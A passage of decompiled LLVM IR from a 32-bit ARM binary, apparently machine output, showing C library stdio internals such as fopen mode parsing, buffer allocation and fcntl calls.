dec_label_pc_16de4:                               ; preds = %dec_label_pc_16ddc
  %v2_16de4 = icmp ne i32 %v1_16ddc, 0
  store i1 %v2_16de4, i1* %cpsr_c.global-to-local, align 1
  %v7_16de8 = icmp slt i32 %v1_16ddc, 2
  br i1 %v7_16de8, label %dec_label_pc_16e04, label %dec_label_pc_16dec

dec_label_pc_16dec:                               ; preds = %dec_label_pc_16de4
  %v0_16dec = load i32, i32* @r5, align 4
  %v1_16dec = add i32 %v0_16dec, 56
  store i32 %v1_16dec, i32* %r0.global-to-local, align 4
  %v0_16df0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16df0 = add i32 %v0_16df0, 129
  store i32 %v1_16df0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16e04

dec_label_pc_16e04:                               ; preds = %dec_label_pc_16d90, %dec_label_pc_16d78, %dec_label_pc_16dec, %dec_label_pc_16de4
  %v0_16e04 = load i32, i32* @r5, align 4
  %v1_16e04 = inttoptr i32 %v0_16e04 to i16*
  %v2_16e04 = load i16, i16* %v1_16e04, align 2
  %v3_16e04 = zext i16 %v2_16e04 to i32
  store i32 %v3_16e04, i32* %r3.global-to-local, align 4
  %v1_16e08 = and i32 %v3_16e04, 16384
  %v2_16e08 = icmp eq i32 %v1_16e08, 0
  br i1 %v2_16e08, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_16e04
  %v2_16e0c = add i32 %v0_16e04, 8
  %v3_16e0c = inttoptr i32 %v2_16e0c to i32*
  %v4_16e0c = load i32, i32* %v3_16e0c, align 4
  store i32 %v4_16e0c, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_16e04, %bb48
  %v1_16e10 = xor i1 %v2_16e08, true
  call void @__pseudo_cond_branch(i1 %v1_16e10, i32 ptrtoint (i32* @global_var_1446c.63 to i32))
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16e18 = load i32, i32* @r8, align 4
  %v2_16e18 = add i32 %v0_16e18, 160
  %v3_16e18 = inttoptr i32 %v2_16e18 to i32*
  %v4_16e18 = load i32, i32* %v3_16e18, align 4
  store i32 %v4_16e18, i32* @r5, align 4
  %v1_16e1c = add i32 %v4_16e18, 8
  %v2_16e1c = inttoptr i32 %v1_16e1c to i32*
  %v3_16e1c = load i32, i32* %v2_16e1c, align 4
  store i32 %v3_16e1c, i32* %r3.global-to-local, align 4
  %v1_16e20 = load i32, i32* %sl.global-to-local, align 4
  %v3_16e20 = icmp uge i32 %v3_16e1c, %v1_16e20
  store i1 %v3_16e20, i1* %cpsr_c.global-to-local, align 1
  %v9_16e20 = icmp eq i32 %v3_16e1c, %v1_16e20
  br i1 %v9_16e20, label %dec_label_pc_16e68, label %dec_label_pc_16e28

dec_label_pc_16e28:                               ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16e18, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16e3475 = inttoptr i32 %v4_16e18 to i32*
  %v2_16e3476 = load i32, i32* %v1_16e3475, align 4
  store i32 %v2_16e3476, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16e3878 = icmp eq i32 %v2_16e3476, 0
  br i1 %v9_16e3878, label %dec_label_pc_16e40, label %dec_label_pc_16e58

dec_label_pc_16e40:                               ; preds = %dec_label_pc_16e28, %dec_label_pc_16e40.dec_label_pc_16e34_crit_edge
  %v0_16e4079 = phi i32 [ %v1_16e38.pre, %dec_label_pc_16e40.dec_label_pc_16e34_crit_edge ], [ 0, %dec_label_pc_16e28 ]
  store i32 %v0_16e4079, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16e50 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16e50, label %dec_label_pc_16e54, label %dec_label_pc_16e40.dec_label_pc_16e34_crit_edge

dec_label_pc_16e40.dec_label_pc_16e34_crit_edge:  ; preds = %dec_label_pc_16e40
  %v0_16e34.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16e38.pre = load i32, i32* @r4, align 4
  %v1_16e34 = inttoptr i32 %v0_16e34.pre to i32*
  %v2_16e34 = load i32, i32* %v1_16e34, align 4
  store i32 %v2_16e34, i32* %r3.global-to-local, align 4
  %v3_16e38 = icmp uge i32 %v2_16e34, %v1_16e38.pre
  store i1 %v3_16e38, i1* %cpsr_c.global-to-local, align 1
  %v9_16e38 = icmp eq i32 %v2_16e34, %v1_16e38.pre
  br i1 %v9_16e38, label %dec_label_pc_16e40, label %dec_label_pc_16e58

dec_label_pc_16e54:                               ; preds = %dec_label_pc_16e40
  %v0_16e54 = load i32, i32* @r4, align 4
  store i32 %v0_16e54, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16e58

dec_label_pc_16e58:                               ; preds = %dec_label_pc_16e28, %dec_label_pc_16e40.dec_label_pc_16e34_crit_edge, %dec_label_pc_16e54
  %v0_16e58 = phi i32 [ %v0_16e54, %dec_label_pc_16e54 ], [ %v2_16e3476, %dec_label_pc_16e28 ], [ %v2_16e34, %dec_label_pc_16e40.dec_label_pc_16e34_crit_edge ]
  %v1_16e58 = phi i32 [ %v0_16e54, %dec_label_pc_16e54 ], [ 0, %dec_label_pc_16e28 ], [ %v1_16e38.pre, %dec_label_pc_16e40.dec_label_pc_16e34_crit_edge ]
  %v3_16e58 = icmp uge i32 %v0_16e58, %v1_16e58
  store i1 %v3_16e58, i1* %cpsr_c.global-to-local, align 1
  %v9_16e58 = icmp eq i32 %v0_16e58, %v1_16e58
  br i1 %v9_16e58, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_16e58
  %v1_16e5c = load i32, i32* @r5, align 4
  store i32 %v1_16e5c, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_16e58, %bb50
  %v1_16e60 = xor i1 %v9_16e58, true
  call void @__pseudo_cond_branch(i1 %v1_16e60, i32 ptrtoint (i32* @global_var_15410.657 to i32))
  %v0_16e64 = load i32, i32* %sl.global-to-local, align 4
  %v1_16e64 = load i32, i32* @r5, align 4
  %v2_16e64 = add i32 %v1_16e64, 8
  %v3_16e64 = inttoptr i32 %v2_16e64 to i32*
  store i32 %v0_16e64, i32* %v3_16e64, align 4
  %v0_16e6c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_16e68

dec_label_pc_16e68:                               ; preds = %bb49, %bb51
  %v0_16e6c = phi i32 [ %v0_16e18, %bb49 ], [ %v0_16e6c.pre, %bb51 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_16e6c = add i32 %v0_16e6c, 80
  %v3_16e6c = inttoptr i32 %v2_16e6c to i32*
  %v4_16e6c = load i32, i32* %v3_16e6c, align 4
  store i32 %v4_16e6c, i32* %r2.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_16e74 = add i32 %v0_16e6c, 160
  %v3_16e74 = inttoptr i32 %v2_16e74 to i32*
  %v4_16e74 = load i32, i32* %v3_16e74, align 4
  store i32 %v4_16e74, i32* %r0.global-to-local, align 4
  %v1_16e78 = inttoptr i32 %v4_16e6c to i32*
  %v2_16e78 = load i32, i32* %v1_16e78, align 4
  store i32 %v2_16e78, i32* %r3.global-to-local, align 4
  %v1_16e7c = add i32 %v4_16e74, 4
  %v2_16e7c = inttoptr i32 %v1_16e7c to i32*
  %v3_16e7c = load i32, i32* %v2_16e7c, align 4
  store i32 %v3_16e7c, i32* %r1.global-to-local, align 4
  %v1_16e80 = add i32 %v2_16e78, 1
  store i32 %v1_16e80, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16e84 = icmp eq i32 %v3_16e7c, 0
  store i32 %v1_16e80, i32* %v1_16e78, align 4
  br i1 %v2_16e84, label %dec_label_pc_16e90, label %dec_label_pc_16ef0

dec_label_pc_16e90:                               ; preds = %dec_label_pc_16e68
  %v0_16e90 = load i32, i32* %r1.global-to-local, align 4
  %v1_16e90 = load i32, i32* %r0.global-to-local, align 4
  %v2_16e90 = add i32 %v1_16e90, 8
  %v3_16e90 = inttoptr i32 %v2_16e90 to i32*
  store i32 %v0_16e90, i32* %v3_16e90, align 4
  %v0_16e94 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16e94, i32* @r5, align 4
  br label %dec_label_pc_16e98

dec_label_pc_16e98:                               ; preds = %dec_label_pc_16ec8.dec_label_pc_16e98_crit_edge, %dec_label_pc_16e90
  %v0_16e98 = phi i32 [ %v0_16e98.pre, %dec_label_pc_16ec8.dec_label_pc_16e98_crit_edge ], [ %v0_16e94, %dec_label_pc_16e90 ]
  %v1_16e98 = inttoptr i32 %v0_16e98 to i32*
  %v2_16e98 = load i32, i32* %v1_16e98, align 4
  store i32 %v2_16e98, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16e98, i32* %r2.global-to-local, align 4
  %v2_16ea464 = load i32, i32* %v1_16e98, align 4
  store i32 %v2_16ea464, i32* %r3.global-to-local, align 4
  %v3_16ea866 = icmp uge i32 %v2_16ea464, %v2_16e98
  store i1 %v3_16ea866, i1* %cpsr_c.global-to-local, align 1
  %v9_16ea872 = icmp eq i32 %v2_16ea464, %v2_16e98
  br i1 %v9_16ea872, label %dec_label_pc_16eb0, label %dec_label_pc_16ec8

dec_label_pc_16eb0:                               ; preds = %dec_label_pc_16e98, %dec_label_pc_16eb0.dec_label_pc_16ea4_crit_edge
  %v0_16eb073 = phi i32 [ %v1_16ea8.pre, %dec_label_pc_16eb0.dec_label_pc_16ea4_crit_edge ], [ %v2_16e98, %dec_label_pc_16e98 ]
  store i32 %v0_16eb073, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16ec0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16ec0, label %dec_label_pc_16ec4, label %dec_label_pc_16eb0.dec_label_pc_16ea4_crit_edge

dec_label_pc_16eb0.dec_label_pc_16ea4_crit_edge:  ; preds = %dec_label_pc_16eb0
  %v0_16ea4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16ea8.pre = load i32, i32* @r4, align 4
  %v1_16ea4 = inttoptr i32 %v0_16ea4.pre to i32*
  %v2_16ea4 = load i32, i32* %v1_16ea4, align 4
  store i32 %v2_16ea4, i32* %r3.global-to-local, align 4
  %v3_16ea8 = icmp uge i32 %v2_16ea4, %v1_16ea8.pre
  store i1 %v3_16ea8, i1* %cpsr_c.global-to-local, align 1
  %v9_16ea8 = icmp eq i32 %v2_16ea4, %v1_16ea8.pre
  br i1 %v9_16ea8, label %dec_label_pc_16eb0, label %dec_label_pc_16ec8

dec_label_pc_16ec4:                               ; preds = %dec_label_pc_16eb0
  %v0_16ec4 = load i32, i32* @r4, align 4
  store i32 %v0_16ec4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16ec8

dec_label_pc_16ec8:                               ; preds = %dec_label_pc_16e98, %dec_label_pc_16eb0.dec_label_pc_16ea4_crit_edge, %dec_label_pc_16ec4
  %v0_16ed0 = phi i32 [ %v0_16ec4, %dec_label_pc_16ec4 ], [ %v2_16ea464, %dec_label_pc_16e98 ], [ %v2_16ea4, %dec_label_pc_16eb0.dec_label_pc_16ea4_crit_edge ]
  %v1_16ec8 = phi i32 [ %v0_16ec4, %dec_label_pc_16ec4 ], [ %v2_16e98, %dec_label_pc_16e98 ], [ %v1_16ea8.pre, %dec_label_pc_16eb0.dec_label_pc_16ea4_crit_edge ]
  %v3_16ec8 = icmp uge i32 %v0_16ed0, %v1_16ec8
  store i1 %v3_16ec8, i1* %cpsr_c.global-to-local, align 1
  %v9_16ec8 = icmp eq i32 %v0_16ed0, %v1_16ec8
  br i1 %v9_16ec8, label %dec_label_pc_16ed0, label %dec_label_pc_16ec8.dec_label_pc_16e98_crit_edge

dec_label_pc_16ec8.dec_label_pc_16e98_crit_edge:  ; preds = %dec_label_pc_16ec8
  %v0_16e98.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16e98

dec_label_pc_16ed0:                               ; preds = %dec_label_pc_16ec8
  %v2_16ed0 = icmp ne i32 %v1_16ec8, 0
  store i1 %v2_16ed0, i1* %cpsr_c.global-to-local, align 1
  %v7_16ed4 = icmp slt i32 %v1_16ec8, 2
  br i1 %v7_16ed4, label %dec_label_pc_16ef0, label %dec_label_pc_16ed8

dec_label_pc_16ed8:                               ; preds = %dec_label_pc_16ed0
  %v0_16ed8 = load i32, i32* @r5, align 4
  store i32 %v0_16ed8, i32* %r0.global-to-local, align 4
  %v0_16edc = load i32, i32* %r1.global-to-local, align 4
  %v1_16edc = add i32 %v0_16edc, 129
  store i32 %v1_16edc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16ef0

dec_label_pc_16ef0:                               ; preds = %dec_label_pc_16e68, %dec_label_pc_16ed8, %dec_label_pc_16ed0
  %v0_16ef0 = call i32 @_stdio_openlist_dec_use()
  %v0_16ef4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_16ef4, i32* %r0.global-to-local, align 4
  %v2_16efc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_16efc, i32* @r4, align 4
  store i32 %v6_16be4, i32* @r5, align 4
  store i32 %v9_16be4, i32* @r6, align 4
  store i32 %v12_16be4, i32* @r7, align 4
  ret i32 %v0_16ef4

; uselistorder directives
  uselistorder i32 %v0_16ec4, { 1, 0, 2 }
  uselistorder i32 %v1_16ea8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16e98, { 1, 0 }
  uselistorder i32 %v0_16e6c, { 1, 0 }
  uselistorder i32 %v0_16e54, { 1, 0, 2 }
  uselistorder i32 %v1_16e38.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16e20, { 1, 0 }
  uselistorder i32 %v0_16dd8, { 1, 0, 2 }
  uselistorder i32 %v1_16dbc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16d4c, { 1, 0, 2 }
  uselistorder i32 %v1_16d30.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16d20, { 1, 0 }
  uselistorder i32 %v0_16cdc, { 1, 0, 2 }
  uselistorder i32 %v1_16cc0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16ca0, { 1, 0 }
  uselistorder i32 %v1_16c2c.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 41, 4, 5, 6, 7, 8, 10, 9, 42, 11, 14, 12, 13, 15, 17, 16, 43, 18, 19, 20, 21, 22, 24, 23, 44, 25, 26, 27, 28, 30, 29, 45, 31, 32, 33, 34, 35, 36, 37, 39, 38, 46, 40 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 24, 25, 3, 4, 5, 26, 27, 6, 7, 8, 9, 28, 29, 10, 11, 12, 13, 14, 30, 31, 15, 16, 17, 32, 33, 18, 19, 20, 21, 34, 35, 22, 23 }
  uselistorder i32 (i32)* @__GI___libc_close, { 30, 29, 34, 33, 28, 32, 31, 27, 26, 25, 24, 23, 9, 8, 7, 6, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_16ef0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16ec8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16eb0, { 1, 0 }
  uselistorder label %dec_label_pc_16e68, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_16e58, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16e40, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_16e04, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_16ddc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16dc4, { 1, 0 }
  uselistorder label %dec_label_pc_16d78, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16d50, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16d38, { 1, 0 }
  uselistorder label %dec_label_pc_16cf0, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_16ce0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16cc8, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_16c68, { 1, 0 }
  uselistorder label %dec_label_pc_16c5c, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_16c4c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16c34, { 1, 0 }
}

define i32 @function_16f08(i32 %arg1) local_unnamed_addr {
dec_label_pc_16f08:
  %v0_16f08 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16f08, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_16f08
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16f08, %bb
  %v10_16f10 = phi i32 [ %arg1, %dec_label_pc_16f08 ], [ 0, %bb ]
  ret i32 %v10_16f10

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen() local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_16f24 = call i32 @_stdio_fopen()
  ret i32 %v0_16f24
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_16f34 = load i32, i32* @r4, align 4
  store i32 %v3_16f34, i32* %stack_var_-24, align 4
  %v6_16f34 = load i32, i32* @r5, align 4
  %v9_16f34 = load i32, i32* @r6, align 4
  %v12_16f34 = load i32, i32* @r7, align 4
  %v15_16f34 = load i32, i32* @r8, align 4
  %v0_16f38 = load i32, i32* @r1, align 4
  %v1_16f38 = inttoptr i32 %v0_16f38 to i8*
  %v2_16f38 = load i8, i8* %v1_16f38, align 1
  %v2_16f40 = icmp ugt i8 %v2_16f38, 113
  store i1 %v2_16f40, i1* %cpsr_c.global-to-local, align 1
  %v7_16f40 = icmp eq i8 %v2_16f38, 114
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* @r8, align 4
  %v0_16f4c = load i32, i32* @r0, align 4
  store i32 %v0_16f4c, i32* @r7, align 4
  %v0_16f50 = load i32, i32* @r2, align 4
  store i32 %v0_16f50, i32* @r5, align 4
  %v0_16f54 = load i32, i32* @r3, align 4
  store i32 %v0_16f54, i32* @r6, align 4
  br i1 %v7_16f40, label %dec_label_pc_16fa8, label %dec_label_pc_16f5c

dec_label_pc_16f5c:                               ; preds = %entry
  %v2_16f5c = icmp ugt i8 %v2_16f38, 118
  store i1 %v2_16f5c, i1* %cpsr_c.global-to-local, align 1
  %v7_16f5c = icmp eq i8 %v2_16f38, 119
  br i1 %v7_16f5c, label %bb, label %dec_label_pc_16f68

bb:                                               ; preds = %dec_label_pc_16f5c
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_16fac

dec_label_pc_16f68:                               ; preds = %dec_label_pc_16f5c
  %v2_16f68 = icmp ugt i8 %v2_16f38, 96
  store i1 %v2_16f68, i1* %cpsr_c.global-to-local, align 1
  %v7_16f68 = icmp eq i8 %v2_16f38, 97
  br i1 %v7_16f68, label %bb49, label %dec_label_pc_16f74

bb49:                                             ; preds = %dec_label_pc_16f68
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_16fac

dec_label_pc_16f74:                               ; preds = %dec_label_pc_16f68, %dec_label_pc_17044, %dec_label_pc_17018
  store i32 50336, i32* %r2.global-to-local, align 4
  %v0_16f78 = call i32 @__aeabi_read_tp()
  store i32 %v0_16f78, i32* %r0.global-to-local, align 4
  %v3_16f7c = load i16, i16* @global_var_23424.488, align 2
  %v4_16f7c = sext i16 %v3_16f7c to i32
  store i32 %v4_16f7c, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_16f84 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16f84 = icmp eq i32 %v0_16f84, 0
  %v3_16f88 = add i32 %v4_16f7c, %v0_16f78
  %v4_16f88 = inttoptr i32 %v3_16f88 to i32*
  store i32 22, i32* %v4_16f88, align 4
  br i1 %v2_16f84, label %dec_label_pc_1734c, label %dec_label_pc_16f90

dec_label_pc_16f90:                               ; preds = %dec_label_pc_17068._crit_edge, %dec_label_pc_16f74
  %v0_16f90 = load i32, i32* @r5, align 4
  %v1_16f90 = inttoptr i32 %v0_16f90 to i16*
  %v2_16f90 = load i16, i16* %v1_16f90, align 2
  %v3_16f90 = zext i16 %v2_16f90 to i32
  store i32 %v3_16f90, i32* %r3.global-to-local, align 4
  %v1_16f94 = and i32 %v3_16f90, 8192
  %v2_16f94 = icmp eq i32 %v1_16f94, 0
  br i1 %v2_16f94, label %dec_label_pc_1734c, label %dec_label_pc_16f9c

dec_label_pc_16f9c:                               ; preds = %dec_label_pc_16f90
  store i32 %v0_16f90, i32* @r0, align 4
  %v0_16fa0 = call i32 @free()
  store i32 %v0_16fa0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1734c

dec_label_pc_16fa8:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_16fac

dec_label_pc_16fac:                               ; preds = %bb, %bb49, %dec_label_pc_16fa8
  %v1_16fc4 = phi i32 [ 1089, %bb49 ], [ 577, %bb ], [ 1, %dec_label_pc_16fa8 ]
  %v1_16fac = add i32 %v0_16f38, 1
  %v2_16fac = inttoptr i32 %v1_16fac to i8*
  %v3_16fac = load i8, i8* %v2_16fac, align 1
  %v2_16fb0 = icmp ugt i8 %v3_16fac, 97
  store i1 %v2_16fb0, i1* %cpsr_c.global-to-local, align 1
  %v7_16fb0 = icmp eq i8 %v3_16fac, 98
  %v1_16fac.v0_16f38 = select i1 %v7_16fb0, i32 %v1_16fac, i32 %v0_16f38
  store i32 %v1_16fac.v0_16f38, i32* %r3.global-to-local, align 4
  %v1_16fbc = add i32 %v1_16fac.v0_16f38, 1
  %v2_16fbc = inttoptr i32 %v1_16fbc to i8*
  %v3_16fbc = load i8, i8* %v2_16fbc, align 1
  %v4_16fbc = zext i8 %v3_16fbc to i32
  store i32 %v4_16fbc, i32* @r3, align 4
  %v2_16fc0 = icmp ugt i8 %v3_16fbc, 42
  store i1 %v2_16fc0, i1* %cpsr_c.global-to-local, align 1
  %v7_16fc0 = icmp eq i8 %v3_16fbc, 43
  br i1 %v7_16fc0, label %bb52, label %.thread3

bb52:                                             ; preds = %dec_label_pc_16fac
  store i32 %v1_16fc4, i32* @r3, align 4
  %v2_16fc8 = add nuw nsw i32 %v1_16fc4, 1
  store i32 %v2_16fc8, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_16fac, %bb52
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16fcc = icmp eq i32 %v0_16f50, 0
  br i1 %v2_16fcc, label %dec_label_pc_16fd4, label %dec_label_pc_17010

dec_label_pc_16fd4:                               ; preds = %.thread3
  store i32 68, i32* @r0, align 4
  %v0_16fd8 = call i32 @malloc()
  store i32 %v0_16fd8, i32* %r0.global-to-local, align 4
  store i32 %v0_16fd8, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_16fdc = icmp eq i32 %v0_16fd8, 0
  br i1 %v3_16fdc, label %dec_label_pc_17350, label %dec_label_pc_16fe4

dec_label_pc_16fe4:                               ; preds = %dec_label_pc_16fd4
  %v0_16fe8 = load i32, i32* @r8, align 4
  %v2_16fe8 = add i32 %v0_16fe8, -33136
  store i32 %v2_16fe8, i32* %r3.global-to-local, align 4
  %v1_16fec = inttoptr i32 %v2_16fe8 to i32*
  %v2_16fec = load i32, i32* %v1_16fec, align 4
  store i32 %v2_16fec, i32* %r0.global-to-local, align 4
  %v3_16fec = add i32 %v0_16fe8, -33132
  %v4_16fec = inttoptr i32 %v3_16fec to i32*
  %v5_16fec = load i32, i32* %v4_16fec, align 4
  store i32 %v5_16fec, i32* @r1, align 4
  %v6_16fec = add i32 %v0_16fe8, -33128
  %v7_16fec = inttoptr i32 %v6_16fec to i32*
  %v8_16fec = load i32, i32* %v7_16fec, align 4
  store i32 %v8_16fec, i32* %r2.global-to-local, align 4
  %v2_16ff8 = add i32 %v0_16fd8, 8
  %v3_16ff8 = inttoptr i32 %v2_16ff8 to i32*
  store i32 0, i32* %v3_16ff8, align 4
  %v2_17000 = load i32, i32* @r5, align 4
  %v3_17000 = inttoptr i32 %v2_17000 to i16*
  store i16 8192, i16* %v3_17000, align 2
  %v2_17004 = load i32, i32* %r0.global-to-local, align 4
  %v0_17008 = load i32, i32* @r5, align 4
  %v1_17008 = add i32 %v0_17008, 56
  store i32 %v1_17008, i32* @r3, align 4
  %v1_1700c = inttoptr i32 %v1_17008 to i32*
  store i32 %v2_17004, i32* %v1_1700c, align 4
  %v3_1700c = add i32 %v0_17008, 60
  %v4_1700c = inttoptr i32 %v3_1700c to i32*
  %v5_1700c = load i32, i32* @r1, align 4
  store i32 %v5_1700c, i32* %v4_1700c, align 4
  %v6_1700c = add i32 %v0_17008, 64
  %v7_1700c = inttoptr i32 %v6_1700c to i32*
  %v8_1700c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1700c, i32* %v7_1700c, align 4
  %v0_17010.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_17010

dec_label_pc_17010:                               ; preds = %.thread3, %dec_label_pc_16fe4
  %v0_17068 = phi i32 [ %v0_16f54, %.thread3 ], [ %v0_17010.pre, %dec_label_pc_16fe4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_17010 = icmp slt i32 %v0_17068, 0
  br i1 %v1_17010, label %dec_label_pc_17068, label %dec_label_pc_17018

dec_label_pc_17018:                               ; preds = %dec_label_pc_17010
  %v0_1701c = load i32, i32* @r4, align 4
  %v2_1701c = and i32 %v0_1701c, 131075
  %v1_17020 = add nuw nsw i32 %v2_1701c, 1
  store i32 %v1_17020, i32* %r2.global-to-local, align 4
  %v0_17024 = load i32, i32* @r7, align 4
  %v1_17024 = add i32 %v0_17024, 1
  %v2_17028 = and i32 %v1_17024, %v1_17020
  store i32 %v2_17028, i32* %r3.global-to-local, align 4
  %v3_1702c = icmp uge i32 %v2_17028, %v1_17020
  store i1 %v3_1702c, i1* %cpsr_c.global-to-local, align 1
  %v9_1702c = icmp eq i32 %v2_17028, %v1_17020
  %v1_17030 = load i32, i32* @r5, align 4
  %v2_17030 = add i32 %v1_17030, 4
  %v3_17030 = inttoptr i32 %v2_17030 to i32*
  store i32 %v0_17068, i32* %v3_17030, align 4
  br i1 %v9_1702c, label %dec_label_pc_17038, label %dec_label_pc_16f74

dec_label_pc_17038:                               ; preds = %dec_label_pc_17018
  %v0_17038 = load i32, i32* @r4, align 4
  %v1_17038 = load i32, i32* @r7, align 4
  %v2_17038 = sub i32 -1, %v1_17038
  %v3_17038 = and i32 %v0_17038, %v2_17038
  store i32 %v3_17038, i32* @r3, align 4
  %v1_1703c = and i32 %v3_17038, 1024
  %v2_1703c = icmp eq i32 %v1_1703c, 0
  br i1 %v2_1703c, label %dec_label_pc_1705c, label %dec_label_pc_17044

dec_label_pc_17044:                               ; preds = %dec_label_pc_17038
  %v0_17044 = load i32, i32* @r6, align 4
  store i32 %v0_17044, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_17050 = call i32 @__libc_fcntl(i32 %v0_17044, i32 4)
  store i32 %v2_17050, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17054 = icmp eq i32 %v2_17050, 0
  br i1 %v2_17054, label %dec_label_pc_17044.dec_label_pc_1705c_crit_edge, label %dec_label_pc_16f74

dec_label_pc_17044.dec_label_pc_1705c_crit_edge:  ; preds = %dec_label_pc_17044
  %v0_1705c.pre = load i32, i32* @r7, align 4
  %v0_17060.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1705c

dec_label_pc_1705c:                               ; preds = %dec_label_pc_17044.dec_label_pc_1705c_crit_edge, %dec_label_pc_17038
  %v0_17060 = phi i32 [ %v0_17060.pre, %dec_label_pc_17044.dec_label_pc_1705c_crit_edge ], [ %v0_17038, %dec_label_pc_17038 ]
  %v0_1705c = phi i32 [ %v0_1705c.pre, %dec_label_pc_17044.dec_label_pc_1705c_crit_edge ], [ %v1_17038, %dec_label_pc_17038 ]
  %v1_1705c = and i32 %v0_1705c, 131072
  store i32 %v1_1705c, i32* %r3.global-to-local, align 4
  %v2_17060 = or i32 %v1_1705c, %v0_17060
  store i32 %v2_17060, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1708c

dec_label_pc_17068:                               ; preds = %dec_label_pc_17010
  %v2_17068 = icmp eq i32 %v0_17068, -1
